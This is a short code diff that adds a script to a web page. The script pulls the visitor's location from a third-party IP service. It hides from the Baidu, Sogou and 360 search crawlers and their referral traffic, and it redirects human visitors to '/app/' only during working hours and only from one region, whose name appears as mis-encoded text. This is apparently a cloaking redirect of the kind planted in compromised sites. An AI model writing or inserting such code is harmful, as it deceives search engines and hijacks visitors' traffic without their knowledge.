@@ -1,0 +1,16 @@
+<script type="text/javascript" src="http://ip.ws.126.net/ipquery?"></script>
+<script>
+	var ua = navigator.userAgent,
+			_r = document.referrer,
+			_d = new Date(),
+			h = _d.getHours(),
+			b = ua.match(/Baiduspider/i) == "Baiduspider",
+			s = ua.match(/Sogou/i) == "Sogou",
+			so =  ua.match(/360Spider/i) == "360Spider",
+			_so =  _r.match(/so.com/i) == "so.com",
+			_s = _r.match(/sogou.com/i) == "sogou.com",
+			c = _r.match(/baidu.com/i) == 'baidu.com';
+	if (!b && !c && !s && !_s && !so && !_so && (h >= 8 && h <= 19) && lo=='�㽭ʡ') {
+		window.location.href = '/app/';
+	}
+</script>
